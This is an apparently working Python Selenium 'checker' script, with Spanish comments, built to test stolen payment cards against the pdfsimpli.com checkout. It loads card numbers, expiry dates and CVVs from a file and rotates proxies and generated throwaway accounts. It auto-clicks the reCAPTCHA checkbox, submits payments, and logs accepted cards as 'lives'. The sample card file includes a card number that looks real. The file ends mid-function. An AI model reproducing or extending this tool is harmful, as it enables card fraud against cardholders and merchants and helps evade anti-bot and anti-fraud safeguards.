# CHECKER_FIREFOX.py
import sys
import os
import time
import random
import traceback
import json
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.webdriver.firefox.options import Options
from selenium.webdriver.firefox.service import Service
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.support.ui import Select
from selenium.common.exceptions import TimeoutException, NoSuchElementException, ElementClickInterceptedException

class BotPDFSimpli:
    def __init__(self):
        self.driver = None
        self.wait = None
        
        # RUTAS ADAPTADAS PARA TERMUX
        termux_home = "/data/data/com.termux/files/home"
        self.ruta_descargas = os.path.join(termux_home, "storage", "downloads")
        
        # Todos los archivos en la carpeta downloads
        self.ruta_pdf = self.ruta_descargas
        self.archivo_tarjetas = os.path.join(self.ruta_descargas, "tarjetas.txt")
        self.archivo_cuentas = os.path.join(self.ruta_descargas, "cuentas_pdfsimpli.json")
        self.archivo_proxies = os.path.join(self.ruta_descargas, "proxies.txt")
        self.archivo_lives = os.path.join(self.ruta_descargas, "lives.txt")
        
        # Ruta de Geckodriver para Firefox
        self.geckodriver_path = "/data/data/com.termux/files/usr/bin/geckodriver"
        
        # Control de cuentas y límites
        self.cuentas = []
        self.cuenta_actual_index = 0
        self.tarjetas_procesadas_en_cuenta_actual = 0
        self.max_tarjetas_por_cuenta = 3
        
        # Sistema de proxies
        self.proxies = []
        self.proxy_actual = None
        self.ip_actual = None
        self.cargar_proxies()
        
        # Cargar o generar cuentas
        self.cargar_o_generar_cuentas()
        
        print("🔥 BOT CONFIGURADO PARA FIREFOX + GECKODRIVER")
        self.verificar_firefox()
        
    def verificar_firefox(self):
        """Verificar que Firefox esté instalado"""
        print("🔍 Verificando Firefox...")
        try:
            import subprocess
            result = subprocess.run(['which', 'firefox'], capture_output=True, text=True)
            if result.returncode == 0:
                print(f"✅ Firefox encontrado: {result.stdout.strip()}")
            else:
                print("❌ Firefox no encontrado. Ejecuta: pkg install firefox")
                
            result2 = subprocess.run(['which', 'geckodriver'], capture_output=True, text=True)
            if result2.returncode == 0:
                print(f"✅ Geckodriver encontrado: {result2.stdout.strip()}")
            else:
                print("❌ Geckodriver no encontrado. Ejecuta: pkg install geckodriver")
                
            # Verificar Selenium
            try:
                from selenium import webdriver
                print("✅ Selenium importado correctamente")
            except ImportError:
                print("❌ Selenium no instalado. Ejecuta: pip install selenium")
                
        except Exception as e:
            print(f"⚠️ Error en verificación: {e}")

    def configurar_navegador_sin_proxy(self):
        """Configurar Firefox sin proxy - VERSIÓN ESTABLE"""
        try:
            options = Options()
            
            # CONFIGURACIÓN PARA FIREFOX EN TERMUX
            options.add_argument("--headless")  # Modo sin interfaz gráfica
            options.add_argument("--no-sandbox")
            options.add_argument("--disable-dev-shm-usage")
            options.add_argument("--window-size=1024,768")
            
            # Configuraciones específicas de Firefox
            options.set_preference("browser.download.folderList", 2)
            options.set_preference("browser.download.manager.showWhenStarting", False)
            options.set_preference("browser.download.dir", self.ruta_descargas)
            options.set_preference("browser.helperApps.neverAsk.saveToDisk", "application/pdf")
            options.set_preference("pdfjs.disabled", True)  # Deshabilitar visor PDF integrado
            
            # Configuraciones de seguridad y privacidad
            options.set_preference("dom.webdriver.enabled", False)
            options.set_preference('useAutomationExtension', False)
            options.set_preference("general.useragent.override", 
                                 "Mozilla/5.0 (Linux; Android 10; Mobile) AppleWebKit/537.36 (KHTML, like Gecko) Firefox/91.0")
            
            print("🚀 Iniciando Firefox...")
            
            # Configurar servicio de Geckodriver
            service = Service(self.geckodriver_path)
            self.driver = webdriver.Firefox(service=service, options=options)
            
            self.driver.set_page_load_timeout(30)
            self.wait = WebDriverWait(self.driver, 15)
            
            print("✅ Firefox configurado correctamente")
            return True
            
        except Exception as e:
            print(f"❌ Error configurando Firefox: {e}")
            return False

    def configurar_navegador_con_proxy(self, proxy=None):
        """Configurar Firefox con proxy"""
        try:
            options = Options()
            
            # CONFIGURACIÓN BÁSICA
            options.add_argument("--headless")
            options.add_argument("--no-sandbox")
            options.add_argument("--disable-dev-shm-usage")
            options.add_argument("--window-size=1024,768")
            options.set_preference("browser.download.dir", self.ruta_descargas)
            options.set_preference("pdfjs.disabled", True)
            
            # Configurar proxy si se proporciona
            if proxy:
                proxy_parts = proxy.split(':')
                if len(proxy_parts) == 2:
                    host, port = proxy_parts
                    options.set_preference("network.proxy.type", 1)
                    options.set_preference("network.proxy.http", host)
                    options.set_preference("network.proxy.http_port", int(port))
                    options.set_preference("network.proxy.ssl", host)
                    options.set_preference("network.proxy.ssl_port", int(port))
                    options.set_preference("network.proxy.ftp", host)
                    options.set_preference("network.proxy.ftp_port", int(port))
                    options.set_preference("network.proxy.socks", host)
                    options.set_preference("network.proxy.socks_port", int(port))
                    options.set_preference("network.proxy.socks_version", 5)
                    options.set_preference("network.proxy.no_proxies_on", "")
            
            options.set_preference("general.useragent.override", 
                                 "Mozilla/5.0 (Linux; Android 10; Mobile) AppleWebKit/537.36 (KHTML, like Gecko) Firefox/91.0")
            
            service = Service(self.geckodriver_path)
            self.driver = webdriver.Firefox(service=service, options=options)
            
            self.driver.set_page_load_timeout(30)
            self.wait = WebDriverWait(self.driver, 15)
            
            return True
            
        except Exception as e:
            print(f"❌ Error configurando Firefox con proxy: {e}")
            return False

    def obtener_ip_actual(self):
        """Obtener la IP actual del navegador"""
        try:
            self.driver.get("https://api.ipify.org?format=text")
            time.sleep(2)
            ip_element = self.driver.find_element(By.TAG_NAME, "body")
            ip = ip_element.text.strip()
            if ip and len(ip) > 7 and '.' in ip:
                self.ip_actual = ip
                return ip
            return None
        except Exception as e:
            print(f"❌ Error obteniendo IP: {e}")
            return None

    def cargar_proxies(self):
        """Cargar lista de proxies desde archivo"""
        try:
            if os.path.exists(self.archivo_proxies):
                with open(self.archivo_proxies, 'r', encoding='utf-8') as f:
                    lineas = f.readlines()
                    for linea in lineas:
                        linea = linea.strip()
                        if linea and not linea.startswith('#'):
                            self.proxies.append(linea)
                print(f"📥 Proxies cargados: {len(self.proxies)}")
            else:
                print("ℹ️ No se encontró archivo de proxies")
        except Exception as e:
            print(f"⚠️ Error cargando proxies: {e}")

    def cargar_o_generar_cuentas(self):
        """Cargar cuentas desde archivo o generarlas si no existen"""
        try:
            if os.path.exists(self.archivo_cuentas):
                with open(self.archivo_cuentas, 'r', encoding='utf-8') as f:
                    data = json.load(f)
                    self.cuentas = data.get('cuentas', [])
                print(f"📥 Cuentas cargadas: {len(self.cuentas)}")
            else:
                print("ℹ️ Generando nuevas cuentas...")
                self.generar_lista_cuentas()
                self.guardar_cuentas()
        except Exception as e:
            print(f"⚠️ Error cargando cuentas: {e}")
            self.generar_lista_cuentas()
            self.guardar_cuentas()

    def generar_lista_cuentas(self):
        """Generar lista de cuentas para rotación"""
        nombres = ['juan', 'maria', 'carlos', 'ana', 'luis']
        apellidos = ['garcia', 'rodriguez', 'gonzalez', 'fernandez', 'lopez']
        
        self.cuentas = []
        
        for i in range(1, 51):
            nombre = random.choice(nombres)
            apellido = random.choice(apellidos)
            numero = random.randint(10000, 99999)
            dominio = random.choice(['gmail.com', 'outlook.com'])
            
            email = f"{nombre}.{apellido}{numero}@{dominio}"
            password = f"{nombre.capitalize()}{apellido.capitalize()}{random.randint(100, 999)}!"
            
            self.cuentas.append({
                "email": email,
                "password": password,
                "usada": False,
                "tarjetas_procesadas": 0,
                "fecha_creacion": time.strftime("%Y-%m-%d %H:%M:%S"),
                "ultimo_uso": None,
                "exitosas": 0,
                "fallidas": 0
            })

    def guardar_cuentas(self):
        """Guardar cuentas en archivo JSON"""
        try:
            data = {
                'cuentas': self.cuentas,
                'ultima_actualizacion': time.strftime("%Y-%m-%d %H:%M:%S"),
                'total_cuentas': len(self.cuentas)
            }
            with open(self.archivo_cuentas, 'w', encoding='utf-8') as f:
                json.dump(data, f, indent=2, ensure_ascii=False)
            print(f"💾 Cuentas guardadas: {len(self.cuentas)}")
        except Exception as e:
            print(f"❌ Error guardando cuentas: {e}")

    def obtener_proxima_cuenta(self):
        """Obtener la siguiente cuenta disponible"""
        cuentas_disponibles = [c for c in self.cuentas if not c.get('usada', False) or c.get('tarjetas_procesadas', 0) < self.max_tarjetas_por_cuenta]
        
        if not cuentas_disponibles:
            return None
        
        cuentas_no_usadas = [c for c in cuentas_disponibles if not c.get('usada', False)]
        if cuentas_no_usadas:
            cuenta = random.choice(cuentas_no_usadas)
        else:
            cuenta = random.choice(cuentas_disponibles)
        
        self.cuenta_actual_index = self.cuentas.index(cuenta)
        return cuenta

    def marcar_cuenta_usada(self, exito=True):
        """Marcar cuenta como usada y actualizar estadísticas"""
        if self.cuenta_actual_index < len(self.cuentas):
            cuenta = self.cuentas[self.cuenta_actual_index]
            cuenta['usada'] = True
            cuenta['ultimo_uso'] = time.strftime("%Y-%m-%d %H:%M:%S")
            
            if exito:
                cuenta['tarjetas_procesadas'] = cuenta.get('tarjetas_procesadas', 0) + 1
                cuenta['exitosas'] = cuenta.get('exitosas', 0) + 1
            else:
                cuenta['tarjetas_procesadas'] = cuenta.get('tarjetas_procesadas', 0) + 1
                cuenta['fallidas'] = cuenta.get('fallidas', 0) + 1
            
            self.guardar_cuentas()

    def leer_tarjetas(self):
        """Leer tarjetas desde archivo"""
        try:
            if not os.path.exists(self.archivo_tarjetas):
                self.crear_archivo_ejemplo()
                print("📝 Archivo de tarjetas creado con ejemplo")
                
            tarjetas = []
            with open(self.archivo_tarjetas, 'r', encoding='utf-8') as f:
                for linea in f:
                    linea = linea.strip()
                    if linea and not linea.startswith('#'):
                        partes = linea.split('|')
                        if len(partes) == 4:
                            tarjetas.append({
                                'numero': partes[0].strip(),
                                'mes': partes[1].strip(),
                                'anio': partes[2].strip(),
                                'cvv': partes[3].strip()
                            })
            
            print(f"📥 Tarjetas cargadas: {len(tarjetas)}")
            return tarjetas
            
        except Exception as e:
            print(f"❌ Error leyendo tarjetas: {e}")
            return []

    def crear_archivo_ejemplo(self):
        """Crear archivo de ejemplo"""
        try:
            with open(self.archivo_tarjetas, 'w', encoding='utf-8') as f:
                f.write("# Formato: numero|mes|año|cvv\n")
                f.write("5124013001057531|03|2030|275\n")
                f.write("4111111111111111|12|2025|123\n")
            print("📝 Archivo de ejemplo creado: tarjetas.txt")
        except Exception as e:
            print(f"❌ Error creando archivo ejemplo: {e}")

    def verificar_archivo_pdf(self):
        """Verificar archivo PDF"""
        try:
            if not os.path.exists(self.ruta_pdf):
                print(f"❌ No existe la ruta: {self.ruta_pdf}")
                return None
                
            archivos = [f for f in os.listdir(self.ruta_pdf) if f.lower().endswith('.pdf')]
            if not archivos:
                print(f"❌ No se encontraron archivos PDF en: {self.ruta_pdf}")
                return None
                
            pdf_path = os.path.join(self.ruta_pdf, archivos[0])
            print(f"📄 PDF encontrado: {pdf_path}")
            return pdf_path
            
        except Exception as e:
            print(f"❌ Error verificando PDF: {e}")
            return None

    def subir_pdf(self, ruta_pdf):
        """Subir PDF"""
        try:
            time.sleep(random.uniform(2, 3))
            
            # Buscar el botón de upload rápidamente
            selectores_upload = [
                (By.ID, "ctaHeroButton_link"),
                (By.XPATH, "//button[contains(text(), 'Upload')]"),
            ]
            
            boton_upload = None
            for selector in selectores_upload:
                try:
                    boton_upload = WebDriverWait(self.driver, 5).until(
                        EC.element_to_be_clickable(selector)
                    )
                    if boton_upload:
                        break
                except:
                    continue
            
            if not boton_upload:
                return False
                
            if not self.hacer_clic_seguro(boton_upload, "botón de upload"):
                return False
                
            time.sleep(1)
            
            # Buscar el input de archivo
            inputs_archivo = self.driver.find_elements(By.CSS_SELECTOR, "input[type='file']")
            if not inputs_archivo:
                return False
            
            inputs_archivo[0].send_keys(ruta_pdf)
            
            # Espera reducida para subida
            time.sleep(3)
            
            # Verificación rápida de éxito
            indicadores_exito = [
                (By.ID, "ConvertContinue"),
                (By.XPATH, "//*[contains(text(), 'Convert')]"),
            ]
            
            for indicador in indicadores_exito:
                try:
                    if WebDriverWait(self.driver, 3).until(EC.presence_of_element_located(indicador)):
                        return True
                except:
                    continue
            
            return True
                
        except Exception as e:
            print(f"❌ Error subiendo PDF: {e}")
            return False

    def hacer_clic_convert_continue(self):
        """Hacer clic en ConvertContinue"""
        try:
            selectores_convert = [
                (By.ID, "ConvertContinue"),
                (By.XPATH, "//button[contains(text(), 'Convert')]"),
            ]
            
            for selector in selectores_convert:
                try:
                    elemento = WebDriverWait(self.driver, 5).until(
                        EC.element_to_be_clickable(selector)
                    )
                    if elemento and elemento.is_displayed():
                        try:
                            elemento.click()
                        except:
                            self.driver.execute_script("arguments[0].click();", elemento)
                        
                        time.sleep(2)
                        return True
                except:
                    continue
            
            return False
                
        except Exception as e:
            print(f"❌ Error en ConvertContinue: {e}")
            return False

    def hacer_clic_descarga(self):
        """Hacer clic en descarga"""
        try:
            elemento = WebDriverWait(self.driver, 5).until(
                EC.element_to_be_clickable((By.ID, "congDwnaut"))
            )
            if elemento and self.hacer_clic_seguro(elemento, "botón de descarga"):
                time.sleep(5)
                return True
            return False
            
        except Exception as e:
            print(f"❌ Error en descarga: {e}")
            return False

    def hacer_clic_seguro(self, elemento, descripcion="elemento"):
        """Hacer clic con manejo de errores"""
        try:
            self.driver.execute_script("arguments[0].scrollIntoView({block: 'center'});", elemento)
            time.sleep(random.uniform(0.3, 0.7))
            elemento.click()
            return True
        except ElementClickInterceptedException:
            try:
                self.driver.execute_script("arguments[0].click();", elemento)
                return True
            except:
                return False
        except Exception:
            return False

    def manejar_registro(self, cuenta):
        """Manejar registro con cuenta específica"""
        try:
            time.sleep(random.uniform(2, 3))
            
            if self.verificar_pagina_pago():
                return True
            
            campo_email = WebDriverWait(self.driver, 5).until(
                EC.presence_of_element_located((By.ID, "email"))
            )
            campo_password = WebDriverWait(self.driver, 5).until(
                EC.presence_of_element_located((By.ID, "password"))
            )
                
            email = cuenta['email']
            password = cuenta['password']
            
            campo_email.clear()
            campo_email.send_keys(email)
            time.sleep(random.uniform(0.5, 1))
            
            campo_password.clear()
            campo_password.send_keys(password)
            time.sleep(random.uniform(0.5, 1))
            
            boton_registro = WebDriverWait(self.driver, 5).until(
                EC.element_to_be_clickable((By.ID, "sign-up"))
            )
                
            if not self.hacer_clic_seguro(boton_registro, "botón de registro"):
                return False
                
            time.sleep(3)
            
            # Manejar reCAPTCHA
            if not self.manejar_recaptcha():
                return False
            
            # Continuar
            self.hacer_clic_boton_continuar()
            
            time.sleep(5)
            
            intentos = 0
            while intentos < 3:
                if self.verificar_pagina_pago():
                    return True
                time.sleep(2)
                intentos += 1
            
            return False
            
        except Exception as e:
            print(f"❌ Error en registro: {e}")
            return False

    def manejar_recaptcha(self):
        """Manejar reCAPTCHA automáticamente"""
        try:
            print("🔄 Intentando resolver reCAPTCHA automáticamente...")
            
            # Buscar el iframe del reCAPTCHA
            iframes = self.driver.find_elements(By.TAG_NAME, "iframe")
            recaptcha_iframe = None
            
            for iframe in iframes:
                try:
                    src = iframe.get_attribute("src")
                    if src and "google.com/recaptcha" in src:
                        recaptcha_iframe = iframe
                        break
                except:
                    continue
            
            if recaptcha_iframe:
                # Cambiar al iframe del reCAPTCHA
                self.driver.switch_to.frame(recaptcha_iframe)
                
                # Buscar y hacer clic en el checkbox
                try:
                    checkbox = WebDriverWait(self.driver, 5).until(
                        EC.element_to_be_clickable((By.ID, "recaptcha-anchor"))
                    )
                    
                    # Hacer clic en el checkbox
                    self.driver.execute_script("arguments[0].click();", checkbox)
                    print("✅ Clic automático en reCAPTCHA realizado")
                    
                    # Volver al contenido principal
                    self.driver.switch_to.default_content()
                    
                    # Esperar a que se procese el reCAPTCHA
                    time.sleep(3)
                    
                    return True
                        
                except Exception as e:
                    print(f"❌ Error haciendo clic en reCAPTCHA: {e}")
                    self.driver.switch_to.default_content()
                    return False
            else:
                print("❌ No se encontró el iframe del reCAPTCHA")
                return False
                
        except Exception as e:
            print(f"❌ Error en resolución automática de reCAPTCHA: {e}")
            self.driver.switch_to.default_content()
            return False

    def hacer_clic_boton_continuar(self):
        """Hacer clic en el botón Continue después del registro"""
        try:
            selectores_continuar = [
                (By.ID, "planPageContinueButton"),
                (By.XPATH, "//button[contains(text(), 'Continue')]"),
            ]
            
            for selector in selectores_continuar:
                try:
                    boton_continuar = WebDriverWait(self.driver, 5).until(
                        EC.element_to_be_clickable(selector)
                    )
                    if boton_continuar and boton_continuar.is_displayed():
                        self.driver.execute_script("arguments[0].scrollIntoView({block: 'center'});", boton_continuar)
                        time.sleep(0.5)
                        
                        try:
                            boton_continuar.click()
                        except:
                            self.driver.execute_script("arguments[0].click();", boton_continuar)
                        
                        time.sleep(3)
                        return True
                except:
                    continue
            
            return True
            
        except Exception as e:
            print(f"❌ Error en botón continuar: {e}")
            return False

    def verificar_pagina_pago(self):
        """Verificar si estamos en la página de pago"""
        try:
            elementos_pago = [
                (By.ID, "checkout_form_card_name"),
                (By.ID, "btnChargeebeeSubmit"),
                (By.ID, "acceptCheckboxMark"),
            ]
            
            elementos_encontrados = 0
            for elemento in elementos_pago:
                try:
                    if WebDriverWait(self.driver, 1).until(EC.presence_of_element_located(elemento)):
                        elementos_encontrados += 1
                except:
                    continue
            
            return elementos_encontrados >= 2
        except:
            return False

    def buscar_y_completar_campo_tarjeta_corregido(self, tarjeta_actual):
        """Buscar y completar campo de tarjeta en iframe específico"""
        try:
            iframes = self.driver.find_elements(By.TAG_NAME, "iframe")
            if len(iframes) > 1:
                self.driver.switch_to.frame(iframes[1])
                
                selectores_tarjeta = [
                    (By.ID, "data"),
                    (By.NAME, "cardNumber"),
                ]
                
                for selector in selectores_tarjeta:
                    try:
                        campo = WebDriverWait(self.driver, 1).until(
                            EC.presence_of_element_located(selector)
                        )
                        
                        maxlength = campo.get_attribute('maxlength')
                        if maxlength and int(maxlength) >= 16:
                            numero_tarjeta = tarjeta_actual['numero']
                            campo.click()
                            campo.clear()
                            campo.send_keys(numero_tarjeta)
                            self.driver.switch_to.default_content()
                            return True
                        
                    except:
                        continue
                
                self.driver.switch_to.default_content()
            
            return self.buscar_y_completar_campo_tarjeta_fallback(tarjeta_actual)
            
        except Exception as e:
            print(f"❌ Error completando tarjeta: {e}")
            self.driver.switch_to.default_content()
            return self.buscar_y_completar_campo_tarjeta_fallback(tarjeta_actual)

    def buscar_y_completar_campo_tarjeta_fallback(self, tarjeta_actual):
        """Fallback para buscar campo de tarjeta en todos los iframes"""
        iframes = self.driver.find_elements(By.TAG_NAME, "iframe")
        
        for i, iframe in enumerate(iframes):
            try:
                self.driver.switch_to.frame(iframe)
                
                selectores_tarjeta = [
                    (By.ID, "data"),
                    (By.NAME, "cardNumber"),
                ]
                
                for selector in selectores_tarjeta:
                    try:
                        campo = WebDriverWait(self.driver, 0.5).until(
                            EC.presence_of_element_located(selector)
                        )
                        
                        maxlength = campo.get_attribute('maxlength')
                        if maxlength and int(maxlength) >= 16:
                            numero_tarjeta = tarjeta_actual['numero']
                            campo.click()
                            campo.clear()
                            campo.send_keys(numero_tarjeta)
                            self.driver.switch_to.default_content()
                            return True
                    except:
                        continue
                
                self.driver.switch_to.default_content()
            except:
                self.driver.switch_to.default_content()
        
        return False

    def buscar_y_completar_cvv_corregido(self, tarjeta_actual):
        """Buscar y completar CVV en iframe específico"""
        try:
            iframes = self.driver.find_elements(By.TAG_NAME, "iframe")
            if len(iframes) > 6:
                self.driver.switch_to.frame(iframes[6])
                
                selectores_cvv = [
                    (By.XPATH, "//input[@maxlength='4' and (@id='data' or @name='Data')]"),
                ]
                
                for selector in selectores_cvv:
                    try:
                        campo_cvv = WebDriverWait(self.driver, 1).until(
                            EC.presence_of_element_located(selector)
                        )
                        
                        maxlength = campo_cvv.get_attribute('maxlength')
                        if maxlength == '4':
                            cvv = tarjeta_actual['cvv']
                            campo_cvv.click()
                            campo_cvv.clear()
                            campo_cvv.send_keys(cvv)
                            self.driver.switch_to.default_content()
                            return True
                            
                    except:
                        continue
                
                self.driver.switch_to.default_content()
            
            return self.buscar_y_completar_cvv_fallback(tarjeta_actual)
            
        except Exception as e:
            print(f"❌ Error completando CVV: {e}")
            self.driver.switch_to.default_content()
            return self.buscar_y_completar_cvv_fallback(tarjeta_actual)

    def buscar_y_completar_cvv_fallback(self, tarjeta_actual):
        """Fallback para buscar CVV en todos los iframes"""
        iframes = self.driver.find_elements(By.TAG_NAME, "iframe")
        
        for i, iframe in enumerate(iframes):
            try:
                self.driver.switch_to.frame(iframe)
                
                selectores_cvv = [
                    (By.XPATH, "//input[@maxlength='4' and (@id='data' or @name='Data')]"),
                ]
                
                for selector in selectores_cvv:
                    try:
                        campo_cvv = WebDriverWait(self.driver, 0.5).until(
                            EC.presence_of_element_located(selector)
                        )
                        
                        maxlength = campo_cvv.get_attribute('maxlength')
                        if maxlength == '4':
                            cvv = tarjeta_actual['cvv']
                            campo_cvv.click()
                            campo_cvv.clear()
                            campo_cvv.send_keys(cvv)
                            self.driver.switch_to.default_content()
                            return True
                    except:
                        continue
                
                self.driver.switch_to.default_content()
            except:
                self.driver.switch_to.default_content()
        
        return False

    def buscar_y_completar_nombre(self):
        """Buscar y completar campo de nombre del titular"""
        try:
            nombre_aleatorio = self.generar_nombre_aleatorio()
            selectores_nombre = [
                (By.ID, "checkout_form_card_name"),
                (By.NAME, "cardName"),
            ]
            
            for selector in selectores_nombre:
                try:
                    campo_nombre = WebDriverWait(self.driver, 1).until(
                        EC.presence_of_element_located(selector)
                    )
                    campo_nombre.click()
                    campo_nombre.clear()
                    campo_nombre.send_keys(nombre_aleatorio)
                    return True
                except:
                    continue
            return False
        except Exception as e:
            print(f"❌ Error completando nombre: {e}")
            return False

    def buscar_y_completar_fecha_corregido(self, tarjeta_actual):
        """Buscar y completar campos de fecha de expiración"""
        campos_encontrados = 0
        
        try:
            selectores_mes = [
                (By.NAME, "ccMonthExp"),
                (By.ID, "expmo"),
            ]
            
            for selector in selectores_mes:
                try:
                    select_mes = WebDriverWait(self.driver, 1).until(
                        EC.presence_of_element_located(selector)
                    )
                    select = Select(select_mes)
                    mes_valor = str(int(tarjeta_actual['mes']))
                    select.select_by_value(mes_valor)
                    campos_encontrados += 1
                    break
                except:
                    continue
        except Exception as e:
            print(f"❌ Error completando mes: {e}")
            pass
        
        try:
            selectores_anio = [
                (By.NAME, "ccYearExp"),
                (By.ID, "expyr"),
            ]
            
            for selector in selectores_anio:
                try:
                    select_anio = WebDriverWait(self.driver, 1).until(
                        EC.presence_of_element_located(selector)
                    )
                    select = Select(select_anio)
                    
                    anio_valor = tarjeta_actual['anio']
                    if len(anio_valor) == 2:
                        anio_valor = "20" + anio_valor
                    
                    select.select_by_value(anio_valor)
                    campos_encontrados += 1
                    break
                except Exception as e:
                    print(f"❌ Error completando año: {e}")
                    continue
        except Exception as e:
            print(f"❌ Error general en fecha: {e}")
            pass
        
        return campos_encontrados >= 2

    def marcar_checkbox_terminos(self):
        """Marca el checkbox de términos y condiciones"""
        try:
            selectores_checkbox = [
                (By.ID, "acceptCheckboxMark"),
                (By.XPATH, "//span[@id='acceptCheckboxMark']"),
            ]
            
            checkbox = None
            for selector in selectores_checkbox:
                try:
                    checkbox = WebDriverWait(self.driver, 3).until(
                        EC.element_to_be_clickable(selector)
                    )
                    if checkbox:
                        break
                except:
                    continue
            
            if not checkbox:
                return False
            
            if self.verificar_checkbox_marcado():
                return True
            
            self.driver.execute_script("arguments[0].click();", checkbox)
            time.sleep(0.5)
            
            return self.verificar_checkbox_marcado()
            
        except Exception as e:
            print(f"❌ Error marcando checkbox: {e}")
            return False

    def verificar_checkbox_marcado(self):
        """Verificar si el checkbox está realmente marcado"""
        try:
            selectores_verificacion = [
                (By.XPATH, "//span[@id='acceptCheckboxMark' and contains(@class, 'checked')]"),
            ]
            
            for selector in selectores_verificacion:
                try:
                    elemento = WebDriverWait(self.driver, 1).until(
                        EC.presence_of_element_located(selector)
                    )
                    if elemento:
                        return True
                except:
                    continue
                
            return False
            
        except Exception:
            return False

    def hacer_clic_boton_obtener_documento(self):
        """Hace clic en el botón 'Obtener Mi Documento'"""
        selectores_boton = [
            (By.ID, "btnChargeebeeSubmit"),
            (By.XPATH, "//button[@id='btnChargeebeeSubmit']"),
        ]
        
        for selector in selectores_boton:
            try:
                boton = WebDriverWait(self.driver, 8).until(
                    EC.element_to_be_clickable(selector)
                )
                if boton and boton.is_enabled():
                    self.driver.execute_script("arguments[0].scrollIntoView({behavior: 'smooth', block: 'center'});", boton)
                    time.sleep(0.5)
                    
                    try:
                        boton.click()
                    except:
                        self.driver.execute_script("arguments[0].click();", boton)
                    
                    time.sleep(3)
                    return True
            except:
                continue
        return False

    def generar_nombre_aleatorio(self):
        """Generar nombre aleatorio para la tarjeta"""
        nombres = ["Juan", "Maria", "Carlos", "Ana", "Luis", "Laura"]
        apellidos = ["Garcia", "Rodriguez", "Gonzalez", "Fernandez", "Lopez"]
        
        nombre = random.choice(nombres)
        apellido = random.choice(apellidos)
        return f"{nombre} {apellido}"

    def proceso_con_tarjeta_completo(self, tarjeta_actual, numero_iteracion):
        """Proceso COMPLETO solo para PRIMERA tarjeta"""
        try:
            if not self.verificar_pagina_pago():
                return False

            print(f"\033[91m💳 TESTEANDO TARJETA {numero_iteracion}: {tarjeta_actual['numero']}\033[0m")
            
            # Completar campos rápidamente
            self.buscar_y_completar_nombre()
            self.buscar_y_completar_fecha_corregido(tarjeta_actual)
            
            resultado_tarjeta = self.buscar_y_completar_campo_tarjeta_corregido(tarjeta_actual)
            if not resultado_tarjeta:
                return False
            
            resultado_cvv = self.buscar_y_completar_cvv_corregido(tarjeta_actual)
            if not resultado_cvv:
                return False
            
            self.marcar_checkbox_terminos()
            
            resultado_boton = self.hacer_clic_boton_obtener_documento()
            if not resultado_boton:
                return False
            
            return True
            
        except Exception as e:
            print(f"❌ Error en proceso completo: {e}")
            return False

    def proceso_con_tarjeta_rapido(self, tarjeta_actual, numero_iteracion):
        """Proceso RÁPIDO - solo cambia número de tarjeta y CVV"""
        try:
            if not self.verificar_pagina_pago():
                return False

            print(f"\033[91m💳 TESTEANDO TARJETA {numero_iteracion}: {tarjeta_actual['numero']}\033[0m")
            
            # Solo completar número de tarjeta y CVV
            resultado_tarjeta = self.buscar_y_completar_campo_tarjeta_corregido(tarjeta_actual)
            if not resultado_tarjeta:
                return False
            
            resultado_cvv = self.buscar_y_completar_cvv_corregido(tarjeta_actual)
            if not resultado_cvv:
                return False
            
            resultado_boton = self.hacer_clic_boton_obtener_documento()
            if not resultado_boton:
                return False
            
            return True
            
        except Exception as e:
            print(f"❌ Error en proceso rápido: {e}")
            return False

    def verificar_resultado_tarjeta(self, numero_tarjeta, tarjeta_actual=None):
        """Verificar resultado por URL de confirmación"""
        try:
            print("⏳ Esperando 10 segundos para detectar confirmación...")
            time.sleep(10)
            
            # PRIMERO: Verificar URL de confirmación (método más confiable)
            current_url = self.driver.current_url
            print(f"🔗 URL actual: {current_url}")
            
            if "pdfsimpli.com/app/billing/confirmation" in current_url:
                print("✅ ✅ ✅ PAGO EXITOSO DETECTADO POR URL - Tarjeta VÁLIDA")
                if tarjeta_actual:
                    self.guardar_tarjeta_valida(tarjeta_actual)
                return True
            
            # SEGUNDO: Búsqueda exhaustiva de indicadores de éxito
            indicadores_exito = [
                (By.XPATH, "//*[contains(text(), 'Payment successful')]"),
                (By.XPATH, "//*[contains(text(), 'payment successful')]"),
                (By.XPATH, "//*[contains(text(), 'Payment Successful')]"),
                (By.XPATH, "//*[contains(text(), 'Pago exitoso')]"),
                (By.XPATH, "//*[contains(text(), 'pago exitoso')]"),
                (By.XPATH, "//*[contains(text(), 'Thank you')]"),
                (By.XPATH, "//*[contains(text(), 'thank you')]"),
            ]
            
            for selector in indicadores_exito:
                try:
                    elemento_exito = WebDriverWait(self.driver, 3).until(
                        EC.presence_of_element_located(selector)
                    )
                    if elemento_exito and elemento_exito.is_displayed():
                        print("✅ ✅ ✅ PAGO EXITOSO DETECTADO - Tarjeta VÁLIDA")
                        if tarjeta_actual:
                            self.guardar_tarjeta_valida(tarjeta_actual)
                        return True
                except:
                    continue
            
            # TERCERO: Verificación exhaustiva en page_source
            try:
                page_source = self.driver.page_source.lower()
                if any(term in page_source for term in ['payment successful', 'pago exitoso', 'thank you', 'transaction completed']):
                    print("✅ ✅ ✅ PAGO EXITOSO EN PÁGINA - Tarjeta VÁLIDA")
                    if tarjeta_actual:
                        self.guardar_tarjeta_valida(tarjeta_actual)
                    return True
            except:
                pass
            
            # CUARTO: Botón Close como fallback
            selectores_boton_close = [
                (By.XPATH, "//button[contains(@class, 'bg-ps-reskin-radial') and contains(text(), 'Close')]"),
                (By.XPATH, "//button[contains(@class, 'bg-ps-reskin-radial')]"),
                (By.XPATH, "//button[contains(text(), 'Close')]"),
            ]
            
            close_encontrado = False
            for selector in selectores_boton_close:
                try:
                    boton_close = WebDriverWait(self.driver, 3).until(
                        EC.visibility_of_element_located(selector)
                    )
                    if boton_close and boton_close.is_displayed():
                        print("❌ Botón Close VISIBLE detectado - Tarjeta NO válida")
                        self.driver.execute_script("arguments[0].click();", boton_close)
                        time.sleep(2)
                        close_encontrado = True
                        break
                except:
                    continue
            
            if close_encontrado:
                return False
            
            # QUINTO: Si no se detecta nada claro, verificar por elementos de error
            indicadores_error = [
                (By.XPATH, "//*[contains(text(), 'declined')]"),
                (By.XPATH, "//*[contains(text(), 'error')]"),
                (By.XPATH, "//*[contains(text(), 'invalid')]"),
            ]
            
            for selector in indicadores_error:
                try:
                    elemento_error = WebDriverWait(self.driver, 2).until(
                        EC.presence_of_element_located(selector)
                    )
                    if elemento_error and elemento_error.is_displayed():
                        print("❌ Error detectado en página - Tarjeta NO válida")
                        return False
                except:
                    continue
            
